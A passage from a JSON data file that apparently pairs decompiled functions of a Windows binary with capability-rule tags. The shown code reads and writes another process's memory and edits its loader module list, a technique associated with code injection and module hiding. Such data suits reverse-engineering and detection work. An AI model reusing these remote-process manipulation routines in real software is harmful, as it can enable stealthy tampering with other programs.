0x20) {\n                                var_24h = fcn.0005a640(var_20h, var_168h, 0, &var_38h, 0x10);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005889f;\n                                }\n                                var_164h = var_168h + -0x10;\n                                var_24h = fcn.0005a640(var_20h, var_164h, 0, &var_100h, 0x88);\n                                if (var_24h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005889f;\n                                }\n                                if (var_d0h == var_ch) {\n                                    *var_10h = var_94h;\n                                    var_24h = 0;\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005889f;\n                                }\n                                var_168h = var_38h;\n                            }\ncode_r0x0005886f:\n                            *var_10h = 0;\n                            var_24h = 0;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n        }\n    }\ncode_r0x0005889f:\n    if (var_20h != 0) {\n        fcn.000789b4(var_20h);\n    }\ncode_r0x000588b1:\n    *in_FS_OFFSET = var_10h_2;\n    return var_24h;\n}\n",
        "token_count": 1638
    },
    "000588d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000588d0(uint param_1, uint *param_2, int32_t *param_3)\n\n{\n    int16_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    uint *var_ch;\n    int32_t *var_10h;\n    uint var_1e8h;\n    uint var_1e0h;\n    uint *var_1dch;\n    uint var_1d8h;\n    uint var_1d0h;\n    uint *var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1b8h;\n    uint *var_1b4h;\n    uint var_1b0h;\n    uint var_1a8h;\n    uint *var_1a4h;\n    uint var_1a0h;\n    int32_t var_19ch;\n    uint var_198h;\n    int32_t var_18ch;\n    uint var_188h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    int32_t var_160h;\n    uint var_15ch;\n    int32_t var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_144h;\n    int32_t var_138h;\n    int32_t var_134h;\n    int32_t var_130h;\n    int32_t var_12ch;\n    int32_t var_128h;\n    int32_t var_124h;\n    int32_t var_120h;\n    int32_t var_11ch;\n    uint var_118h;\n    int32_t var_100h;\n    uint var_f8h;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b0h;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_78h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_21h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d60;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xfffffe08;\n    var_28h = 0;\n    var_1ch = 0;\n    if (var_ch == NULL) {\n        var_2ch = 0x21590066;\n        goto code_r0x000591cc;\n    }\n    if (var_10h == NULL) {\n        var_2ch = 0x21590067;\n        goto code_r0x000591cc;\n    }\n    *var_10h = 0;\n    var_2ch = fcn.0005a7d0(&var_28h, 0x438, var_8h);\n    if ((var_2ch == 0) && (var_2ch = fcn.0005a540(var_28h, &var_21h),  var_2ch == 0)) {\n        var_21h._0_1_ = '\\x01' - (var_21h != '\\0');\n        var_2ch = fcn.0005a130(var_28h, &var_30h);\n        if (var_2ch == 0) {\n            var_4h = 0;\n            if (var_21h == '\\0') {\n                var_19ch = 0;\n                if ((var_ch[1] == 0) && (var_ch[5] == 0)) {\n                    var_2ch = fcn.0005a640(var_28h, var_30h, 0, &var_198h, 0x10);\n                    if (var_2ch == 0) {\n                        if (var_18ch == 0) {\n                            var_2ch = -1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            fcn.00078bfa(&var_188h, 0, 0x68);\n                            var_170h = *var_ch;\n                            var_168h = var_ch[2];\n                            var_144h = var_ch[3];\n                            var_154h = 0x1004;\n                            var_16ch = var_ch[4];\n                            var_150h._0_2_ = 1;\n                            var_1cch = var_ch + 6;\n                            do {\n                                iVar1 = *var_1cch;\n                                var_1cch = var_1cch + 2;\n                            } while (iVar1 != 0);\n                            var_1d8h._0_2_ = var_1cch - (var_ch + 0x1a) >> 1;\n                            var_15ch._0_2_ = var_1d8h << 1;\n                            if (var_15ch < 2) {\n                                var_15ch._0_2_ = 2;\n                                *(var_ch + 6) = 0;\n                            }\n                            var_15ch._2_2_ = var_15ch + 2;\n                            var_1dch = var_ch + 0x88;\n                            do {\n                                iVar1 = *var_1dch;\n                                var_1dch = var_1dch + 2;\n                            } while (iVar1 != 0);\n                            var_1e8h._0_2_ = var_1dch - (var_ch + 0x222) >> 1;\n                            var_164h._0_2_ = var_1e8h << 1;\n                            if (var_164h < 2) {\n                                var_164h._0_2_ = 2;\n                                *(var_ch + 6) = 0;\n                            }\n                            var_164h._2_2_ = var_164h + 2;\n                            var_19ch = 0;\n                            unique0x00002400 = var_15ch._2_2_ + 0x68 + var_164h._2_2_;\n                            var_2ch = fcn.00078bac(var_28h, &var_19ch, 0, &var_21h + 1, 0x3000, 4);\n                            if (var_2ch == 0) {\n                                var_1ch = var_19ch;\n                                var_158h = var_19ch + 0x68;\n                                var_2ch = fcn.0005a680(var_28h, var_158h, 0, var_ch + 6, var_15ch._2_2_);\n                                if (var_2ch == 0) {\n                                    var_160h = var_19ch + 0x68 + var_15ch._2_2_;\n                                    var_2ch = fcn.0005a680(var_28h, var_160h, 0, var_ch + 0x88, var_164h._2_2_);\n                                    if (var_2ch == 0) {\n                                        var_138h = var_19ch + 0x50;\n                                        var_134h = var_19ch + 0x50;\n                                        var_130h = var_19ch + 0x58;\n                                        var_12ch = var_19ch + 0x58;\n                                        var_128h = var_19ch + 0x60;\n                                        var_124h = var_19ch + 0x60;\n                                        var_2ch = fcn.0005a680(var_28h, var_19ch, 0, &var_188h, 0x68);\n                                        if (var_2ch == 0) {\n                                            fcn.00057f80(var_28h, var_18ch + 0xc, var_19ch);\n                                            fcn.00057f80(var_28h, var_18ch + 0x14, var_19ch + 8);\n                                            *var_10h = var_19ch;\n                                            goto code_r0x0005916a;\n                                        }\n                                        var_4h = 0xffffffff;\n                                    }\n                                    else {\n                                        var_4h = 0xffffffff;\n                                    }\n                                }\n                                else {\n                                    var_4h = 0xffffffff;\n                                }\n                            }\n                            else {\n                                var_4h = 0xffffffff;\n                            }\n                        }\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_11ch = 0;\n                var_2ch = fcn.0005a640(var_28h, var_30h, 0, &var_118h, 0x20);\n                if (var_2ch == 0) {\n                    var_120h = var_100h;\n                    if (var_100h == 0) {\n                        var_2ch = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        fcn.00078bfa(&var_f8h, 0, 200);\n                        var_c8h = *var_ch;\n                        var_c4h = var_ch[1];\n                        var_b8h = var_ch[2];\n                        var_78h = var_ch[3];\n                        var_90h = 0x1004;\n                        var_c0h = var_ch[4];\n                        var_bch = var_ch[5];\n                        var_8ch._0_2_ = 1;\n                        var_1a4h = var_ch + 6;\n                        do {\n                            iVar1 = *var_1a4h;\n                            var_1a4h = var_1a4h + 2;\n                        } while (iVar1 != 0);\n                        var_1b0h._0_2_ = var_1a4h - (var_ch + 0x1a) >> 1;\n                        var_a0h._0_2_ = var_1b0h << 1;\n                        if (var_a0h < 2) {\n                            var_a0h._0_2_ = 2;\n                            *(var_ch + 6) = 0;\n                        }\n                        var_a0h._2_2_ = var_a0h + 2;\n                        var_1b4h = var_ch + 0x88;\n                        do {\n                            iVar1 = *var_1b4h;\n                            var_1b4h = var_1b4h + 2;\n                        } while (iVar1 != 0);\n                        var_1c0h._0_2_ = var_1b4h - (var_ch + 0x222) >> 1;\n                        var_b0h._0_2_ = var_1c0h << 1;\n                        if (var_b0h < 2) {\n                            var_b0h._0_2_ = 2;\n                            *(var_ch + 6) = 0;\n                        }\n                        var_b0h._2_2_ = var_b0h + 2;\n                        var_11ch = 0;\n                        unique0x00002880 = var_a0h._2_2_ + 200 + var_b0h._2_2_;\n                        var_2ch = fcn.00078bac(var_28h, &var_11ch, 0, &var_21h + 1, 0x3000, 4);\n                        if (var_2ch == 0) {\n                            var_1ch = var_11ch;\n                            var_98h = var_11ch + 200;\n                            var_94h = 0;\n                            var_2ch = fcn.0005a680(var_28h, var_98h, 0, var_ch + 6, var_a0h._2_2_);\n                            if (var_2ch == 0) {\n                                var_a8h = var_11ch + 200 + var_a0h._2_2_;\n                                var_a4h = 0;\n                                var_2ch = fcn.0005a680(var_28h, var_a8h, 0, var_ch + 0x88, var_b0h._2_2_);\n                                if (var_2ch == 0) {\n                                    var_60h = var_11ch + 0x98;\n                                    var_5ch = 0;\n                                    var_58h = var_11ch + 0x98;\n                                    var_54h = 0;\n                                    var_50h = var_11ch + 0xa8;\n                                    var_4ch = 0;\n                                    var_48h = var_11ch + 0xa8;\n                                    var_44h = 0;\n                                    var_40h = var_11ch + 0xb8;\n                                    var_3ch = 0;\n                                    var_38h = var_11ch + 0xb8;\n                                    var_34h = 0;\n                                    var_2ch = fcn.0005a680(var_28h, var_11ch, 0, &var_f8h, 200);\n                                    if (var_2ch == 0) {\n                                        fcn.00057e40(var_28h, var_120h + 0x10, var_11ch);\n                                        fcn.00057e40(var_28h, var_120h + 0x20, var_11ch + 0x10);\n                                        *var_10h = var_11ch;\ncode_r0x0005916a:\n                                        var_2ch = 0;\n                                        var_4h = 0xffffffff;\n                                    }\n                                    else {\n                                        var_4h = 0xffffffff;\n                                    }\n                                }\n                                else {\n                                    var_4h = 0xffffffff;\n                                }\n                            }\n                            else {\n                                var_4h = 0xffffffff;\n                            }\n                        }\n                        else {\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n        }\n    }\n    if ((var_2ch != 0) && (var_1ch != 0)) {\n        stack0xffffffdc = 0;\n        fcn.00078ba0(var_28h, &var_1ch, &var_21h + 1, 0x8000);\n    }\n    if (var_28h != 0) {\n        fcn.000789b4(var_28h);\n    }\ncode_r0x000591cc:\n    *in_FS_OFFSET = var_10h_2;\n    return var_2ch;\n}\n",
        "token_count": 3503
    },
    "000591e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000591e0(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    uint *var_ch;\n    uint var_158h;\n    uint32_t var_124h;\n    uint var_f0h;\n    uint32_t var_88h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8cb0;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    *0x10 = &stack0xfffffe98;\n    var_20h = 0;\n    if (var_ch == NULL) {\n        var_24h = 0x21590066;\n        goto code_r0x000593bd;\n    }\n    var_24h = fcn.0005a7d0(&var_20h, 0x438, var_8h);\n    if ((var_24h == 0) && (var_24h = fcn.0005a540(var_20h, &var_19h),  var_24h == 0)) {\n        var_19h._0_1_ = '\\x01' - (var_19h != '\\0');\n        var_4h = 0;\n        if (var_19h == '\\0') {\n            var_24h = fcn.0005a640(var_20h, *var_ch, 0, &var_158h, 0x68);\n            if (var_24h == 0) {\n                var_124h = var_124h & 0xffffefff | 0xc4000;\n                var_24h = fcn.0005a680(var_20h, *var_ch, 0, &var_158h, 0x68);\n                if (var_24h == 0) goto code_r0x00059384;\n                var_4h = 0xffffffff;\n            }\n            else {\n                var_4h = 0xffffffff;\n            }\n        }\n        else {\n            var_24h = fcn.0005a640(var_20h, *var_ch, 0, &var_f0h, 200);\n            if (var_24h == 0) {\n                var_88h = var_88h & 0xffffefff | 0xc4000;\n                var_24h = fcn.0005a680(var_20h, *var_ch, 0, &var_f0h, 200);\n                if (var_24h == 0) {\ncode_r0x00059384:\n                    var_24h = 0;\n                    var_4h = 0xffffffff;\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_4h = 0xffffffff;\n            }\n        }\n    }\n    if (var_20h != 0) {\n        fcn.000789b4(var_20h);\n    }\ncode_r0x000593bd:\n    *in_FS_OFFSET = var_10h;\n    return var_24h;\n}\n",
        "token_count": 778
    },
    "000593d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.000593d0(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch;\n    uint var_18h;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8da0;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    puStack28 = &stack0xffffffc8;\n    if (var_ch == 0) {\n        var_28h = 0x21590066;\n    }\n    else {\n        var_28h = fcn.00058050(var_8h, var_ch, &var_20h);\n        if ((var_28h == 0) && (var_28h = fcn.0005a7d0(&var_24h, 0x18, var_8h),  var_28h == 0)) {\n            var_4h = 0;\n            var_1ch = 0;\n            fcn.00078ba0(var_24h, &var_20h, &var_1ch, 0x8000);\n            fcn.000789b4(var_24h);\n            var_28h = 0;\n        }\n    }\n    *in_FS_OFFSET = var_10h;\n    return var_28h;\n}\n",
        "token_count": 390
    },
    "000594b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000594b0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.000356c0(0x20a);\n    if (arg_ch_00 == 0) {\n        var_4h = 0x21590004;\n    }\n    else {\n        iVar1 = fcn.00078b8e(arg_ch_00, arg_ch, 0x104);\n        if (iVar1 == -1) {\n            var_4h = 0x21590004;\n        }\n        else {\n            *(arg_ch_00 + 0x104) = 0;\n            var_4h = fcn.00059530(arg_8h, arg_ch_00, arg_10h);\n        }\n        fcn.000357f0(arg_ch_00);\n    }\n    return var_4h;\n}\n",
        "token_count": 234
    },
    "00059530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00059530(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_ch == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        uVar2 = fcn.000789f0(arg_ch, 0x5c);\n        if (uVar2 == 0) {\n            uVar2 = fcn.000789f0(arg_ch, 0x2f);\n        }\n        uVar1 = fcn.000595a0(arg_8h, arg_ch, uVar2 & 0xffffff00 | uVar2 != 0, 0, arg_10h);\n    }\n    return uVar1;\n}\n",
        "token_count": 209
    },
    "000595a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000595a0(uint param_1, int16_t *param_2, char param_3, char param_4, int32_t *param_5)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int16_t *var_ch;\n    uint var_10h;\n    uint var_14h;\n    int32_t *var_18h_2;\n    uint32_t var_24ch;\n    uint32_t var_248h;\n    uint var_244h;\n    uint var_23ch;\n    int16_t *var_238h;\n    uint var_234h;\n    int32_t var_230h;\n    uint var_22ch;\n    uint *var_228h;\n    uint var_224h;\n    int32_t var_210h;\n    uint var_200h;\n    int32_t var_1f4h;\n    uint var_1f0h;\n    int32_t var_1d8h;\n    uint var_1cch;\n    uint var_1c4h;\n    int32_t var_188h;\n    int32_t var_180h;\n    int32_t var_17ch;\n    int32_t var_178h;\n    uint *var_174h;\n    uint var_170h;\n    int32_t var_150h;\n    uint var_130h;\n    int32_t var_118h;\n    uint var_110h;\n    int32_t var_e0h;\n    uint var_c8h;\n    uint var_b8h;\n    int32_t var_48h;\n    uint32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    char var_1eh;\n    char var_1dh;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d50;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xfffffda4;\n    var_1ch = 0;\n    var_238h = var_ch;\n    do {\n        iVar1 = *var_238h;\n        var_238h = var_238h + 1;\n    } while (iVar1 != 0);\n    var_38h = (var_238h - (var_ch + 1) >> 1) << 1;\n    var_28h = 0;\n    if (var_ch == NULL) {\n        var_30h = 0x21590066;\n        goto code_r0x00059c7b;\n    }\n    if (var_18h_2 == NULL) {\n        var_30h = 0x21590069;\n        goto code_r0x00059c7b;\n    }\n    *var_18h_2 = 0;\n    var_1ch = fcn.000356c0(0x20a);\n    if (var_1ch == 0) {\n        var_30h = 0x21590004;\n        goto code_r0x00059c7b;\n    }\n    var_30h = fcn.0005a7d0(&var_28h, 0x438, var_8h);\n    if ((var_30h == 0) && (var_30h = fcn.0005a540(var_28h, &var_1dh),  var_30h == 0)) {\n        var_1dh = '\\x01' - (var_1dh != '\\0');\n        var_30h = fcn.0005a4f0(var_28h, &var_1eh);\n        if (var_30h == 0) {\n            if (var_14h == '\\0') {\n                var_30h = fcn.0005a130(var_28h, &var_34h);\n            }\n            else {\n                var_30h = fcn.0005a170(var_28h, &var_34h);\n            }\n            if (var_30h == 0) {\n                var_4h = 0;\n                if ((var_1dh == '\\0') && ((var_1eh == '\\0' || (var_14h == '\\0')))) {\n                    var_30h = fcn.0005a640(var_28h, var_34h, 0, &var_200h, 0x10);\n                    if (var_30h == 0) {\n                        if (var_1f4h == 0) {\n                            var_30h = -1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_30h = fcn.0005a640(var_28h, var_1f4h, 0, &var_224h, 0x24);\n                            if (var_30h == 0) {\n                                if (var_10h == '\\0') {\n                                    var_228h = &var_1c4h;\n                                }\n                                else {\n                                    var_228h = &var_1cch;\n                                }\n                                var_230h = var_210h;\n                                while (var_230h != var_1f4h + 0x14) {\n                                    var_30h = fcn.0005a640(var_28h, var_230h, 0, &var_188h, 8);\n                                    if (var_30h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x00059c5d;\n                                    }\n                                    var_30h = fcn.0005a640(var_28h, var_230h + -8, 0, &var_1f0h, 0x48);\n                                    if (var_30h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x00059c5d;\n                                    }\n                                    if (var_38h == *var_228h) {\n                                        if (*var_228h >> 1 < 0x104) {\n                                            var_24ch = *var_228h >> 1;\n                                        }\n                                        else {\n                                            var_24ch = 0x104;\n                                        }\n                                        var_24h = var_24ch;\n                                        iVar2 = fcn.0005a640(var_28h, var_228h[1], 0, var_1ch, var_24ch << 1);\n                                        if (iVar2 == 0) {\n                                            *(var_1ch + var_24h * 2) = 0;\n                                            iVar2 = fcn.000789a8(var_1ch, var_ch, var_24h);\n                                            if (iVar2 == 0) {\n                                                var_30h = fcn.0005a640(var_28h, var_230h + 0x30, 0, &var_2ch, 2);\n                                                if (var_30h != 0) {\n                                                    var_4h = 0xffffffff;\n                                                    goto code_r0x00059c5d;\n                                                }\n                                                if (var_2ch != -1) {\n                                                    var_2ch._0_2_ = var_2ch + 1;\n                                                    var_30h = fcn.0005a680(var_28h, var_230h + 0x30, 0, &var_2ch, 2);\n                                                    if (var_30h != 0) {\n                                                        var_4h = 0xffffffff;\n                                                        goto code_r0x00059c5d;\n                                                    }\n                                                }\n                                                *var_18h_2 = var_1d8h;\n                                                break;\n                                            }\n                                        }\n                                    }\n                                    var_230h = var_188h;\n                                }\ncode_r0x00059c25:\n                                var_30h = (-(*var_18h_2 != 0) & 0xdea6fffb) + 0x21590005;\n                                var_4h = 0xffffffff;\n                            }\n                            else {\n                                var_4h = 0xffffffff;\n                            }\n                        }\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_30h = fcn.0005a640(var_28h, var_34h, 0, &var_130h, 0x20);\n                    if (var_30h == 0) {\n                        var_180h = var_118h;\n                        if (var_118h == 0) {\n                            var_30h = -1;\n                            var_4h = 0xffffffff;\n                        }\n                        else {\n                            var_30h = fcn.0005a640(var_28h, var_118h, 0, &var_170h, 0x40);\n                            if (var_30h == 0) {\n                                if (var_10h == '\\0') {\n                                    var_174h = &var_b8h;\n                                }\n                                else {\n                                    var_174h = &var_c8h;\n                                }\n                                var_17ch = var_150h;\n                                while (var_17ch != var_180h + 0x20) {\n                                    var_30h = fcn.0005a640(var_28h, var_17ch, 0, &var_48h, 0x10);\n                                    if (var_30h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x00059c5d;\n                                    }\n                                    var_178h = var_17ch + -0x10;\n                                    var_30h = fcn.0005a640(var_28h, var_178h, 0, &var_110h, 0x88);\n                                    if (var_30h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x00059c5d;\n                                    }\n                                    if (var_38h == *var_174h) {\n                                        if (*var_174h >> 1 < 0x104) {\n                                            var_248h = *var_174h >> 1;\n                                        }\n                                        else {\n                                            var_248h = 0x104;\n                                        }\n                                        var_24h = var_248h;\n                                        iVar2 = fcn.0005a640(var_28h, var_174h[2], var_174h[3], var_1ch, var_248h << 1);\n                                        if (iVar2 == 0) {\n                                            *(var_1ch + var_24h * 2) = 0;\n                                            iVar2 = fcn.000789a8(var_1ch, var_ch, var_24h);\n                                            if (iVar2 == 0) {\n                                                var_30h = fcn.0005a640(var_28h, var_178h + 0x6c, 0, &var_2ch, 2);\n                                                if (var_30h != 0) {\n                                                    var_4h = 0xffffffff;\n                                                    goto code_r0x00059c5d;\n                                                }\n                                                if (var_2ch != -1) {\n                                                    var_2ch._0_2_ = var_2ch + 1;\n                                                    var_30h = fcn.0005a680(var_28h, var_178h + 0x6c, 0, &var_2ch, 2);\n                                                    if (var_30h != 0) {\n                                                        var_4h = 0xffffffff;\n                                                        goto code_r0x00059c5d;\n                                                    }\n                                                }\n                                                *var_18h_2 = var_e0h;\n                                                break;\n                                            }\n                                        }\n                                    }\n                                    var_17ch = var_48h;\n                                }\n                                goto code_r0x00059c25;\n                            }\n                            var_4h = 0xffffffff;\n                        }\n                    }\n                    else {\n                        var_4h = 0xffffffff;\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00059c5d:\n    if (var_28h != 0) {\n        fcn.000789b4(var_28h);\n    }\n    fcn.000357f0(var_1ch);\ncode_r0x00059c7b:\n    *in_FS_OFFSET = var_10h_2;\n    return var_30h;\n}\n",
        "token_count": 2838
    },
    "00059c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00059c90(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    uint var_228h;\n    int32_t var_224h;\n    uint var_220h;\n    uint var_21ch;\n    int32_t var_208h;\n    uint var_1f8h;\n    int32_t var_1ech;\n    uint var_1e8h;\n    int32_t var_1d0h;\n    int32_t var_17ch;\n    int32_t var_174h;\n    int32_t var_170h;\n    int32_t var_16ch;\n    uint var_168h;\n    int32_t var_148h;\n    uint var_128h;\n    int32_t var_110h;\n    uint var_108h;\n    int32_t var_d8h;\n    int32_t var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d40;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    *0x10 = &stack0xfffffdc8;\n    var_20h = 0;\n    if (var_ch == 0) {\n        var_28h = 0x21590066;\n        goto code_r0x0005a11c;\n    }\n    var_28h = fcn.0005a7d0(&var_20h, 0x438, var_8h);\n    if ((var_28h == 0) && (var_28h = fcn.0005a540(var_20h, &var_19h),  var_28h == 0)) {\n        var_19h._0_1_ = '\\x01' - (var_19h != '\\0');\n        var_28h = fcn.0005a130(var_20h, &var_2ch);\n        if (var_28h == 0) {\n            var_4h = 0;\n            if (var_19h == '\\0') {\n                var_28h = fcn.0005a640(var_20h, var_2ch, 0, &var_1f8h, 0x10);\n                if (var_28h == 0) {\n                    if (var_1ech == 0) {\n                        var_28h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_28h = fcn.0005a640(var_20h, var_1ech, 0, &var_21ch, 0x24);\n                        if (var_28h == 0) {\n                            var_224h = var_208h;\n                            while (var_224h != var_1ech + 0x14) {\n                                var_28h = fcn.0005a640(var_20h, var_224h, 0, &var_17ch, 8);\n                                if (var_28h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005a10a;\n                                }\n                                var_28h = fcn.0005a640(var_20h, var_224h + -8, 0, &var_1e8h, 0x48);\n                                if (var_28h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005a10a;\n                                }\n                                if (var_1d0h == var_ch) {\n                                    var_28h = fcn.0005a640(var_20h, var_224h + 0x30, 0, &var_24h, 2);\n                                    if (var_28h != 0) {\n                                        var_4h = 0xffffffff;\n                                        goto code_r0x0005a10a;\n                                    }\n                                    if ((var_24h != 0) && (var_24h != -1)) {\n                                        var_24h._0_2_ = var_24h + -1;\n                                        var_28h = fcn.0005a680(var_20h, var_224h + 0x30, 0, &var_24h, 2);\n                                        if (var_28h != 0) {\n                                            var_4h = 0xffffffff;\n                                            goto code_r0x0005a10a;\n                                        }\n                                    }\n                                    var_28h = 0;\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005a10a;\n                                }\n                                var_224h = var_17ch;\n                            }\n                            goto code_r0x0005a0e3;\n                        }\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_28h = fcn.0005a640(var_20h, var_2ch, 0, &var_128h, 0x20);\n                if (var_28h == 0) {\n                    var_174h = var_110h;\n                    if (var_110h == 0) {\n                        var_28h = -1;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_28h = fcn.0005a640(var_20h, var_110h, 0, &var_168h, 0x40);\n                        if (var_28h == 0) {\n                            var_170h = var_148h;\n                            while (var_170h != var_174h + 0x20) {\n                                var_28h = fcn.0005a640(var_20h, var_170h, 0, &var_40h, 0x10);\n                                if (var_28h != 0) {\n                                    var_4h = 0xffffffff;\n                                    goto code_r0x0005a10a;\n                                }\n                                var_16ch = var_170h + -0x10;\n                                var_28h = fcn.0005a640(var_20h, var_16ch, 0, &var_108h, 0x88);\n                                if (var_28h != 0) 